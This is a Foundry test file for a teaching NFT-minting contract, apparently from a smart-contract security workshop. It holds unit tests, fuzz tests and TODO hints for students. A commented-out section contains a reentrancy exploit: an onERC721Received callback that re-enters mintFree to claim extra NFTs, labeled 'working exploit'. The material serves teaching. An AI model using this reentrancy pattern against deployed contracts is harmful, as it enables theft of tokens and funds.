//SPDX-License-Identifier: WTFPL
pragma solidity 0.8.9;

import {Test} from "forge-std/Test.sol";
import "../src/GoldMinter.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/interfaces/IERC721Receiver.sol";

contract GoldMinterTest is Test /*, IERC721Receiver*/ {
    GoldMinter nftmin;
    address bob = makeAddr("bob");
    address alice = makeAddr("alice");
    bool exploitActive;
    uint8 exploitCount;
    uint8 exploitMaxCount;

    // Automatically executed prior to each test
    function setUp() public {
        // Bob start with 1000 ether
        vm.deal(bob, 1000 ether);
        // Now, every call is executed by Bob
        vm.startPrank(bob);
        // Instance of the contract to test
        nftmin = new GoldMinter(0.25 ether, 10);
    }

    receive() external payable {}

    function test_constructor() public {
        assertEq(0.25 ether, nftmin.PRICE_TO_PAY());
        assertFalse(address(nftmin.nft()) == address(0), "NFT not deployed");
    }

    function test_mintOne() public {
        uint256 balanceBefore = address(nftmin).balance;
        nftmin.mintOne{value: 1 ether}();
        uint256 balanceAfter = address(nftmin).balance;

        assertEq(nftmin.nft().getTotalMinted(), 1);
        // assertLt(balanceBefore, balanceAfter);
        assertEq(balanceBefore + nftmin.PRICE_TO_PAY(), balanceAfter);
    }

    function test_sweepFunds() public {
        uint256 balanceBefore = address(bob).balance;

        vm.deal(alice, 1 ether);
        changePrank(alice);
        nftmin.mintOne{value: nftmin.PRICE_TO_PAY()}();

        changePrank(bob);
        nftmin.sweepFunds();
        uint256 balanceAfter = address(bob).balance;

        assertGt(balanceAfter, balanceBefore);

        /**
         * TODO:
         * - All funds going to Bob
         * - Alice with changePrank
         */
    }

    function test_mintMany() public {
        vm.deal(address(nftmin), 1000 ether);
        uint256 amount = 5;
        uint256 _value = amount * nftmin.PRICE_TO_PAY();
        nftmin.mintMany{value: _value}(amount);

        assertEq(nftmin.nft().balanceOf(bob), amount);

        _value = (nftmin.MINT_LIMIT() + 1) * nftmin.PRICE_TO_PAY();
        vm.expectRevert(AboveMintLimit.selector);
        nftmin.mintMany{value: _value}(11);
        /**
         * TODO:
         * - The amount mint must be equal to real mint
         * - Don't have must mint more than 10 in the same transaction.
         */
    }

    function test_fuzz_minting(uint256 val, uint256 amount) public {
        val = bound(val, nftmin.PRICE_TO_PAY(), 10 ether);
        amount = bound(amount, 1, 10);
        vm.assume(val >= nftmin.PRICE_TO_PAY() * amount);

        uint256 accumulated;
        nftmin.mintMany{value: val}(amount);
        accumulated = nftmin.PRICE_TO_PAY() * amount;

        assertEq(accumulated, address(nftmin).balance);

        /** TODO:
         * Define a phantom variable:
         * check that the value that should be charged is equal to the value
         * who receives the contract, even when more is sent.
         *
         */
    }

    function test_mintFree() public {
        vm.deal(bob, 10 ether);
        uint256 amount = 5;
        uint256 _value = amount * nftmin.PRICE_TO_PAY();
        nftmin.mintMany{value: _value}(amount);

        vm.expectRevert(NotEnoughPoints.selector);
        nftmin.mintFree();

        nftmin.mintMany{value: _value}(amount);

        uint256 balanceBefore = nftmin.nft().balanceOf(bob);
        nftmin.mintFree();
        uint256 balanceAfter = nftmin.nft().balanceOf(bob);

        assertEq(balanceBefore + 1, balanceAfter);

        vm.expectRevert(AlreadyClaimed.selector);
        nftmin.mintFree();

        /** TODO:
         * - check that it is indeed a free NFT
         * - check that you can't lie if you have few points
         * - check that you can't lie twice
         * tips:
         * - 2 expectReverts, 3 calls to mintFree, and 1 assert
         */
    }

    // function test_exploitReentrancy() public {
    //     // nota: ejecutando transacción como carlos
    //     vm.stopPrank();
    //     uint256 amount = nftmin.PRIZE_THRESHOLD();
    //     uint256 cost = nftmin.PRICE_TO_PAY() * amount;
    //     nftmin.mintMany{value: cost}(amount);

    //     // exploit context
    //     exploitActive = true;
    //     exploitMaxCount = 5;
    //     nftmin.mintFree();

    //     // chequear si funcionó
    //     assertEq(
    //         nftmin.nft().balanceOf(address(this)),
    //         amount + exploitMaxCount + 1
    //     );

    //     /** TODO:
    //    * - we need a contract to control the flow of execution
    //    * - we need to successfully trigger mintFree
    //    * - once control is taken, we develop the logic of the exploit
    //    * - we create its context before calling, and its behavior in onERC721
    //    * - check that it worked effectively
    //    * - fix the error and hope it fails
    //    */
    // }

    // function onERC721Received(
    //     address operator,
    //     address from,
    //     uint256 tokenId,
    //     bytes calldata data
    // ) external returns (bytes4) {
    //     if (exploitActive && exploitCount < exploitMaxCount) {
    //         exploitCount++;
    //         nftmin.mintFree();
    //     }
    //     return IERC721Receiver.onERC721Received.selector;
    // }

    // // working exploit
    // function onERC721Received(
    //     address operator,
    //     address from,
    //     uint256 tokenId,
    //     bytes calldata data
    // ) external returns (bytes4) {
    //     if (exploitReent && exploitCount < exploitMaxCount) {
    //         exploitCount++;
    //         NFTMinter(payable(address(operator))).mintFree();
    //         // analog to nftmin.mintFree();
    //     } else {
    //         exploitReent = false;
    //         delete exploitCount;
    //     }
    //     return IERC721Receiver.onERC721Received.selector;
    // }

    function test_mintFreeDeluxe() public {
        uint256 amount = 10;
        uint256 _value = amount * nftmin.PRICE_TO_PAY();
        nftmin.mintMany{value: _value}(amount);

        uint256 balanceBefore = nftmin.nft().balanceOf(bob);
        nftmin.mintFreeDeluxe();
        uint256 balanceAfter = nftmin.nft().balanceOf(bob);
        assertEq(balanceBefore + 1, balanceAfter);

        /** TODO:
         * (UserPoints / TotalMintednfts * 100 > 20).
         * - minte from different accounts
         * - check that it delivers 1 nft
         * - check that you can't lie twice
         */
    }

    function getsDeluxe(uint256 points) internal view returns (bool) {
        points *= 100;
        points /= nftmin.nft().getTotalMinted();

        return points > 20;
    }

    function test_fuzz_mintDeluxe(uint256 val, uint256 amount) public {
        uint256 _value;
        vm.deal(bob, 100 ether);
        vm.deal(alice, 100 ether);
        // limit the fuzz with bound and assumes
        val = bound(val, nftmin.PRICE_TO_PAY(), 10 ether);
        amount = bound(amount, 1, 10);
        vm.assume(val >= nftmin.PRICE_TO_PAY() * amount);

        // mint with my first user x times
        changePrank(alice);
        _value = amount * nftmin.PRICE_TO_PAY();
        nftmin.mintMany{value: _value}(amount);
        nftmin.mintMany{value: _value}(amount);

        changePrank(bob);
        nftmin.mintMany{value: _value}(amount);
        nftmin.mintMany{value: _value}(amount);

        assertEq(getsDeluxe(amount), nftmin.mintFreeDeluxe());

        /** TODO:
          * - generate the necessary context so that the data can be compared
              results of the two functions
          * - lie with two users, different amounts, being that the
              amount of who will claim respect the condition to claim
          * - what things can we assume make sense for this test?
         */
    }
    // chisel demo
    // bool r
    // uint256 points = 10
    // uint256 total = 20
    // r = points/total * 100 > 20
    // r = points * 100 / total > 20
}
